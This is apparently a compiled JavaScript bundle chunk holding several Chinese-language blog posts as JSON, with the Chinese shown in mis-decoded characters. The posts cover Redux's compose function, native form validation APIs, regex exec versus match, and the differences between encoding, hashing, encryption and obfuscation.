"},{"anchor":"dian-de-geng-xin-fang-fa-_strokeupdate","level":5,"text":"ç‚¹çš„æ›´æ–°æ–¹æ³•<code>_strokeUpdate</code>"},{"anchor":"hua-dian-de-fang-fa-this_drawdot","level":5,"text":"ç”»ç‚¹çš„æ–¹æ³•<code>this._drawDot</code>"},{"anchor":"hua-xian-de-fang-fa-this__drawcurve","level":5,"text":"ç”»çº¿çš„æ–¹æ³•<code>this.__drawCurve</code>"},{"anchor":"zong-jie","level":4,"text":"æ€»ç»“"}],"relatedTags":null,"created_at":"2019-06-18","timeArr":[2019,5,18,0,0,0,0],"title":"æºç é˜…è¯»-signature_pad","uuid":"70c0ac44839743166637d895a36548085cbfc645","summary":"<p><a href=\\"https://github.com/szimek/signature_pad\\">signature_pad</a>ä¸€ä¸ªåŸºäºCanvasçš„å¹³æ»‘æ‰‹å†™ç”»æ¿å·¥å…·</p>","slug":"yuan-ma-yue-du-signature_pad","sha":"feecc3d4a25186c780dc6453dc129b62bca69809"}')},682:function(n){n.exports=JSON.parse('{"content":"<p>å…ˆä¸Šæºç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å°†(fun1,fun2,fun3)è½¬æ¢æˆfun1(fun2(fun3()))</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compose</span>(<span class=\\"hljs-params\\">...funcs</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">0</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">arg</span> =&gt;</span> arg\\n  }\\n\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">1</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> funcs[<span class=\\"hljs-number\\">0</span>]\\n  }\\n  <span class=\\"hljs-comment\\">// é‡ç‚¹ç†è§£çš„ä¸€å¥ è¿™é‡Œçš„reduceå†…éƒ¨è¿˜è¿”å›äº†ä¸€ä¸ªå‡½æ•°</span>\\n  <span class=\\"hljs-keyword\\">return</span> funcs.reduce(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a, b</span>) =&gt;</span> <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> a(b(...args)))\\n}</code></pre></code></pre>\\n<p>é‡ç‚¹çœ‹ä¸€å¥å°±å¤Ÿäº†ï¼š<code>return funcs.reduce((a, b) =&gt; (...args) =&gt; a(b(...args)))</code></p>\\n<p>ç°åœ¨æˆ‘ä»¬å…ˆå‡è®¾ä¸€ä¸ªæ•°ç»„ï¼Œæœ‰3ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯x,y,z</p>\\n<p>é‚£ä¹ˆ<code>compose([x,y,z])</code>å‘ç”Ÿä»€ä¹ˆäº†ï¼Œæ¥ä¸‹æ¥å°±ä¸€æ­¥ä¸€æ­¥è§£é‡Š</p>\\n<ol>\\n<li>å˜æˆreduceæ¨¡å¼ï¼š<code>[x,y,z].reduce((a, b) =&gt; (...args) =&gt; a(b(...args)))</code></li>\\n<li>reduceç¬¬ä¸€æ¬¡æ‰§è¡Œï¼Œaä¸ºxï¼Œbä¸ºyï¼Œreduceå†…éƒ¨è¿”å›<code>(...args)=&gt;x(y(...args))</code></li>\\n<li>reduceç¬¬äºŒæ¬¡æ‰§è¡Œï¼Œå› ä¸ºä¼šå°†ä¸Šä¸€æ¬¡çš„è¿”å›å€¼ä½œä¸ºaï¼Œè¿™æ¬¡bä¸ºzï¼Œå› æ­¤å°†z(...args)å¥—è¿›açš„å‚æ•°ï¼Œå˜æˆï¼š<code>(...args)=&gt;x(y(z(...args)))</code></li>\\n<li>æ‰§è¡Œç»“æŸï¼Œæœ€åcomposeå°±è¿”å›äº†è¿™ä¹ˆä¸ªä¸œè¥¿<code>(...args)=&gt;x(y(z(...args)))</code></li>\\n</ol>\\n<p>å› æ­¤ï¼Œå¦‚æœå¤–éƒ¨è°ƒç”¨æ˜¯è¿™æ ·çš„<code>compose(...)(ä¸€äº›å‚æ•°)</code>ï¼Œé‚£ä¹ˆè¿™é‡Œçš„å‚æ•°å°†ä¼šå¥—è¿›ä¸Šé¢è¿”å›å€¼çš„<code>(...args)</code>ï¼Œæœ€ç»ˆå˜æˆ<code>x(y(z(ä¸€äº›å‚æ•°)))</code></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-13","timeArr":[2018,5,13,0,0,0,0],"title":"æºç é˜…è¯»-å­¦ä¹ reduxçš„compose","uuid":"bc4cf19b8dcd0b9fd7c436d8de5961ecf9099175","summary":"<p>å…ˆä¸Šæºç ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å°†(fun1,fun2,fun3)è½¬æ¢æˆfun1(fun2(fun3()))</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compose</span>(<span class=\\"hljs-params\\">...funcs</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">0</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">arg</span> =&gt;</span> arg\\n  }\\n\\n  <span class=\\"hljs-keyword\\">if</span> (f...</code></pre>","slug":"yuan-ma-yue-du-xue-xi-redux-de-compose","sha":"1c31d66483e93c9656f2d42ae1164c3b016501b8"}')},683:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"biao-dan-yan-zheng-yuan-sheng\\">è¡¨å•éªŒè¯åŸç”Ÿ</h2>\\n<ul>\\n<li><p>æŸ¥çœ‹æ˜¯å¦é€šè¿‡éªŒè¯ï¼š\\n<code>ele.checkValidity</code></p>\\n</li>\\n<li><p>éªŒè¯ä¸é€šè¿‡çš„æ—¶å€™çš„æç¤ºï¼ˆåªè¯»ï¼‰ï¼š\\n<code>ele.validationMessage</code></p>\\n<p>  å¯ä»¥é€šè¿‡setCustomValidityä¿®æ”¹ï¼Œè®¾ä¸ºç©ºå­—ç¬¦ä¸²è¡¨ç¤ºå–æ¶ˆè‡ªå®šä¹‰æç¤ºï¼Œä½†è¦è®¾å®šæ¡ä»¶ï¼Œå¦åˆ™é»˜è®¤ä¸é€šè¿‡</p>\\n<p>  <code>ele.setCustomValidity(&quot;è‡ªå®šä¹‰æŠ¥é”™å†…å®¹&quot;)</code></p>\\n</li>\\n<li><p>æŸ¥çœ‹æ˜¯å¦åœ¨submitæ—¶è¿›è¡ŒéªŒè¯ï¼ˆåªè¯»ï¼‰ï¼š\\n<code>ele.willValidate</code> </p>\\n</li>\\n<li><p>ä¸ä½¿ç”¨è‡ªå¸¦éªŒè¯</p>\\n</li>\\n</ul>\\n<p><code>novalidate</code>ç”¨äº&lt;form&gt;</p>\\n<p><code>formnovalidate</code>ç”¨äº&lt;å†…éƒ¨æ§ä»¶&gt;</p>\\n<p>å‚è€ƒ:<a href=\\"https://wangdoc.com/javascript/bom/form.html\\">https://wangdoc.com/javascript/bom/form.html</a></p>\\n","toc":[{"anchor":"biao-dan-yan-zheng-yuan-sheng","level":2,"text":"è¡¨å•éªŒè¯åŸç”Ÿ"}],"relatedTags":null,"created_at":"2018-08-17","timeArr":[2018,7,17,0,0,0,0],"title":"åŸç”Ÿè¡¨å•éªŒè¯ç›¸å…³","uuid":"bd9804a5d37884a5eff1d06717429f0517cd2782","summary":"<h4>è¡¨å•éªŒè¯åŸç”Ÿ</h4>\\n<ul>\\n<li>\\n<p>æŸ¥çœ‹æ˜¯å¦é€šè¿‡éªŒè¯ï¼š\\n<code>ele.checkValidity</code></p>\\n</li>\\n<li>\\n<p>éªŒè¯ä¸é€šè¿‡çš„æ—¶å€™çš„æç¤ºï¼ˆåªè¯»ï¼‰ï¼š\\n<code>ele.validationMessage</code></p>\\n<p>å¯ä»¥é€šè¿‡setCustomValidityä¿®æ”¹ï¼Œè®¾ä¸ºç©ºå­—ç¬¦ä¸²è¡¨ç¤ºå–æ¶ˆè‡ªå®šä¹‰æç¤ºï¼Œä½†è¦è®¾å®šæ¡ä»¶ï¼Œå¦åˆ™é»˜è®¤ä¸é€šè¿‡</p>\\n<p>`ele.set...</p>\\n</li>\\n</ul>","slug":"yuan-sheng-biao-dan-yan-zheng-xiang-guan","sha":"9d6992f642b20f00a885c2f614ed58f5ff23a0e4"}')},684:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"zheng-ze--exec-he-match\\">æ­£åˆ™ execå’Œmatch</h2>\\n<ul>\\n<li>éƒ½æ˜¯è¿”å›æ•°ç»„ï¼ŒåŒ…æ‹¬å°æ‹¬å·å†…éƒ¨</li>\\n<li>éå…¨å±€ ä¸€è‡´</li>\\n<li>matchå…¨å±€ï¼ŒåŒ¹é…å¤šä¸ªå€¼</li>\\n<li>execå…¨å±€ï¼ŒåŒ¹é…å•ä¸ªå€¼ï¼Œä½†æ¯æ¬¡æ‰§è¡Œä¼šç»§ç»­ä»ä¸Šä¸€æ¬¡åŒ¹é…æ•°æ®ä¹‹åå¼€å§‹<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> str=<span class=\\"hljs-string\\">\'this is a stick\'</span>\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>let reg=/.is/\\nreg.exec(str)   // [&quot;his&quot;, index: 1, input: &quot;this is a stick&quot;, groups: undefined]\\nreg.exec(str)   // [&quot;his&quot;, index: 1, input: &quot;this is a stick&quot;, groups: undefined]</p>\\n<p>let regG=/.is/g\\nregG.exec(str)  // [&quot;his&quot;, index: 1, input: &quot;this is a stick&quot;, groups: undefined]\\nregG.exec(str)  // [&quot; is&quot;, index: 4, input: &quot;this is a stick&quot;, groups: undefined]\\nregG.exec(str)  // null</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n## æ­£åˆ™çš„é™æ€å±æ€§\\n\\n| é•¿å±æ€§å | çŸ­å±æ€§å | è¯´æ˜ |\\n| :------| :---: | :---- |\\n| input | $_ | æœ€è¿‘ä¸€æ¬¡è¦åŒ¹é…çš„å­—ç¬¦ä¸² |\\n| lastMatch | $&amp; | æœ€è¿‘ä¸€æ¬¡åŒ¹é…é¡¹ |\\n| lastParen | $+ | æœ€è¿‘ä¸€æ¬¡åŒ¹é…çš„æ•è·ç»„ |\\n| leftContext | $` | inputå­—ç¬¦ä¸²ä¸­lastMatchä¹‹å‰çš„æ–‡æœ¬ |\\n| rightContext | $\' | inputå­—ç¬¦ä¸²ä¸­lastMatchä¹‹åçš„æ–‡æœ¬ |\\n| multiline | $* | å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦æ‰€æœ‰è¡¨è¾¾å¼éƒ½ä½¿ç”¨å¤šè¡Œæ¨¡å¼|\\n\\n```js\\nlet str=&quot;short stick&quot;\\nlet pattern=/s/g\\n\\n// ç¬¬ä¸€æ¬¡æ‰§è¡Œ(ä¹Ÿå¯ä»¥ç”¨exec)\\npattern.test(str)\\nRegExp.rightContext   // &quot;hort stick&quot;\\nRegExp[&quot;$\'&quot;]          // &quot;hort stick&quot;\\n\\n// ç¬¬äºŒæ¬¡æ‰§è¡Œ\\npattern.test(str)\\nRegExp.rightContext   // &quot;tick&quot;\\nRegExp[&quot;$\'&quot;]          // &quot;tick&quot;</code></pre></code></pre>","toc":[{"anchor":"zheng-ze--exec-he-match","level":2,"text":"æ­£åˆ™ execå’Œmatch"}],"relatedTags":null,"created_at":"2018-07-11","timeArr":[2018,6,11,0,0,0,0],"title":"æ­£åˆ™é—æ¼ç‚¹","uuid":"5fc1f9d14abff5f33e3b3a286fadfe82ad9a48b2","summary":"<h4>æ­£åˆ™ execå’Œmatch</h4>\\n<ul>\\n<li>éƒ½æ˜¯è¿”å›æ•°ç»„ï¼ŒåŒ…æ‹¬å°æ‹¬å·å†…éƒ¨</li>\\n<li>éå…¨å±€ ä¸€è‡´</li>\\n<li>matchå…¨å±€ï¼ŒåŒ¹é…å¤šä¸ªå€¼</li>\\n<li>execå…¨å±€ï¼ŒåŒ¹é…å•ä¸ªå€¼ï¼Œä½†æ¯æ¬¡æ‰§è¡Œä¼šç»§ç»­ä»ä¸Šä¸€æ¬¡åŒ¹é…æ•°æ®ä¹‹åå¼€å§‹</li>\\n</ul>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> str=<span class=\\"hljs-string\\">\'this is a stick\'</span>\\n\\n<span class=\\"hljs-keyword\\">let</span> reg=<span class=\\"hljs-regexp\\">/.is/</span>\\nreg.exec(str)   /...</code></pre>","slug":"zheng-ze-yi-lou-dian","sha":"150a56b6eb7cd88a1e0662000a7a8f23e0c8003a"}')},685:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><p>ç¼–ç </p>\\n<p>  è½¬æ¢æ•°æ®æ ¼å¼ä½¿å…¶èƒ½è¢«å„ç§ç³»ç»Ÿæ‰§è¡Œï¼Œç®—æ³•å…¬å¼€</p>\\n</li>\\n<li><p>hash</p>\\n<p>  ä¸€ä¸ªå¤šå¯¹ä¸€çš„è½¬æ¢ï¼Œä¸å¯é€†ï¼Œé•¿åº¦å›ºå®šï¼Œç”¨äºæ£€æµ‹æ–‡ä»¶æ˜¯å¦æœ‰æ”¹åŠ¨</p>\\n<p>  å››ä¸ªç‰¹æ€§ï¼š</p>\\n<ol>\\n<li>è¾“å…¥ç›¸åŒï¼Œè¾“å‡ºä¸€å®šç›¸åŒ</li>\\n<li>ç»å¤§éƒ¨åˆ†ä¸åŒçš„è¾“å…¥ä¸åº”è¯¥äº§ç”Ÿç›¸åŒçš„è¾“å‡º</li>\\n<li>è¾“å…¥åˆ°è¾“å‡ºè¡Œä¸ºä¸å¯é€†</li>\\n<li>å¯¹è¾“å…¥å€¼çš„ä¿®æ”¹ä¼šå¯¼è‡´è¾“å‡ºäº§ç”Ÿå·¨å¤§çš„æ”¹å˜</li>\\n</ol>\\n</li>\\n<li><p>åŠ å¯†</p>\\n<p>  ä¸€ä¸ªä¸€å¯¹ä¸€çš„è½¬æ¢ï¼Œå¯é€†ï¼Œé•¿åº¦ä¸å®šï¼ŒåŒ…æ‹¬ç®—æ³•å’Œå¯†é’¥ï¼Œå¦‚æœçŸ¥é“ç®—æ³•ä¸çŸ¥é“å¯†é’¥è¿˜æ˜¯éå¸¸éš¾ä»å¯†æ–‡è½¬æ¢åˆ°æ˜æ–‡</p>\\n</li>\\n<li><p>æ··æ·†</p>\\n<p>  è®©æ–‡ä»¶éš¾ä»¥ç†è§£ï¼Œä½†èƒ½è¢«è®¡ç®—æœºæ‰§è¡Œ</p>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-07-04","timeArr":[2018,6,4,0,0,0,0],"title":"è½¬ç ,Hash,åŠ å¯†,æ··æ·†åŒºåˆ«æ€»ç»“","uuid":"c177754811a4f2e83d02b2906306ad34211a38a7","summary":"<ul>\\n<li>\\n<p>ç¼–ç </p>\\n<p>è½¬æ¢æ•°æ®æ ¼å¼ä½¿å…¶èƒ½è¢«å„ç§ç³»ç»Ÿæ‰§è¡Œï¼Œç®—æ³•å…¬å¼€</p>\\n</li>\\n<li>\\n<p>hash</p>\\n<p>ä¸€ä¸ªå¤šå¯¹ä¸€çš„è½¬æ¢ï¼Œä¸å¯é€†ï¼Œé•¿åº¦å›ºå®šï¼Œç”¨äºæ£€æµ‹æ–‡ä»¶æ˜¯å¦æœ‰æ”¹åŠ¨</p>\\n<p>å››ä¸ªç‰¹æ€§ï¼š</p>\\n<ol>\\n<li>è¾“å…¥ç›¸åŒï¼Œè¾“å‡ºä¸€å®šç›¸åŒ</li>\\n<li>ç»å¤§éƒ¨åˆ†ä¸åŒçš„è¾“å…¥ä¸åº”è¯¥äº§ç”Ÿç›¸åŒçš„è¾“å‡º</li>\\n<li>è¾“å…¥åˆ°è¾“å‡ºè¡Œä¸ºä¸å¯é€†\\n4....</li>\\n</ol>\\n</li>\\n</ul>","slug":"zhuan-ma-Hash-jia-mi-hun-xiao-qu-bie-zong-jie","sha":"22a37b52e29256c6227488765b3c7bae7216c9d5"}')}}]);